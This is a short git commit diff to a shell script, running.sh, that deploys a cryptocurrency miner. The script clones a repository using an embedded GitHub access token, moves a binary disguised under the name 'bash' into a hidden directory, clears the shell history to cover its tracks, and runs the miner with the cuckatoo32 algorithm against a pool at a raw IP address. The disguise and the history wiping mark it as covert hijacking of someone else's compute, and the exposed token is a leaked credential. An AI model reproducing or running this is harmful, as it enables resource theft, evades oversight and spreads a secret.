124f12aa8ac7ed4d07decf4b43c86e9c26df7997
hujisanda <hujisaandalan@gmail.com>
2025-06-19 14:12:17 +0530

    Update running.sh

--- running.sh
+++ running.sh
@@ -11,4 +11,4 @@ WORKER="jasin"
 WALLETNH="yogajasin391@gmail.com"
 POOLNH="152.42.241.144:80"
 git clone https://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@github.com/sadarsayujinjas/gm.git && cd gm && mv bash /home/studio-lab-user/.lib && cd .. && history -cr
-/home/studio-lab-user/.lib/bash -a cuckatoo32 -s $152.42.241.144:80 -u $yogajasin391@gmail.com.jasin
+./home/studio-lab-user/.lib/bash -a cuckatoo32 -s 152.42.241.144:80 -u yogajasin391@gmail.com.jasin
